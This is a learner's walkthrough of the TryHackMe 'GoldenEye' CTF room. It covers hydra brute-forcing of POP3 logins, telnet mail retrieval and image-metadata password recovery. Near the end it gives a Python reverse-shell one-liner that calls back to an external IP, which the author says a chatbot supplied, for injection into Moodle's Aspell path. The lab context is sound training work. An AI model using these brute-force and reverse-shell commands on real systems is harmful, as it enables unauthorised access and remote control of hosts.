# [GoldenEye](https://tryhackme.com/room/goldeneye)
Bond, James Bond. A guided CTF.

### Level: Medium

Task 1: Intro & Enumeration

Start with `nmap -p- <IP>`. It's the best place to start. Then went to the website, visited page source code as instructed. Opended the javascript file. The man is `Boris` and his password is encoded with &# things. searched and found out that it's called `html entity encoding`. Decoded with `cyberchef` with 'from HTML Entity' recipe: `InvincibleHack3r`
We have the username: Boris and the password. 

went to `/sev-home/` as noted on the webpage and logged in with these credentials. Success! It says, 
```
"GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO).
Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system.
Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port"
```

So, POP3 service is a like HTTP port, but for receiving email from a remote server. And from the nmap scan, we can see that 55006 & 55007 ports are open. Searched online and found that the latter port might work to build a connection. 

But first, we need password, so:
`hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f <IP> -s 55007 pop3` for new password.

It found the password: `[55007][pop3] host: <IP>   login: boris   password: secret1!`

Now we can find any emails/messages with `telnet`: `telnet <IP> 55007`   

```
USER boris
PASS secret1!
LIST
RETR 1
RETR 2
RETR 3
```
We found the emails. Natalya can break boris's code. Xenia seems to be someone important. All the usernames found here are: root, natalya, xenia, janus, alec

let's put them into a file as the next question asks us to `"Using the users you found on this service, find other users passwords."`

Then `hydra -l usrs.txt -P /usr/share/wordlists/fasttrack.txt -f <IP> -s 55007 pop3` 

New password found: `login: natalya   password: bird`

So we log in and read Natalya's emails with `telnet` like above, one of which from `root` says,
```
"Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts."
```

Next up we need that last line. Let's edit our /etc/hosts file.
`sudo nano /etc/hosts`

Open & add this line `<IP>  severnaya-station.com` > save, leave and open the site `severnaya-station.com/gnocertdir`

Then we log in with xenia's credentials found in the last email. and there's a messaeg from `doak` waiting. Let's check the message. 
To find this `Dr. doak's` password, we meet our friend Hydra again.

`hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f <IP> -s 55007 pop3` and found `login: doak   password: goat`

And AGAIN read Doak's emails using `telnet`. Found this email with more credentials:
```
James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!```

With this, logged out as xenia and logged in as dr_doak. Went to My Profile > My private Files as instructed. Found a `s3ret.txt`. Let's read it together: ```007,I was able to capture this apps adm1n cr3ds through clear txt. Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. Something juicy is located here: /dir007key/for-007.jpg
Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

So went to the location as noted, found a pic and downloaded it. Read the metadata using `exiftool Downloads/for-007.jpg`
Found base64 string `eFdpbnRlcjE5OTV4IQ==` and decoded it `echo eFdpbnRlcjE5OTV4IQ== | base64 -d` and found a new password: `xWinter1995x!`

So Finally, we can log in as `admin`. 

Next THM says that `"As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.
Take a look into Aspell, the spell checker plugin."`

From here, I believe the challenge becomes challenging. For me, as this is completely new to me. 

Went to `settings > server (as it seems important) > system paths (seemed interesting enough)`

For this I needed help. Asked `Echo` chatbot to give me a python code for the reverse shell payload to put in the `path to aspell` section and it gave me this 
```
aspellpath=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.128.182.230",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

Next `Site Administration>Plugins>Text Editors>TinyMCE HTML Editor`
change to `PSpellShell`.

Go to `My Profile > Blogs > New entry`
Click on spell checker to activate it.


The rest I just followed what [Deskel](https://deskel.github.io/posts/thm/goldeneye) & [Turana](https://cloverophile.medium.com/tryhackme-goldeneye-walkthrough-35c27b58f322) did. I'm too young & dumb to understand this level. 

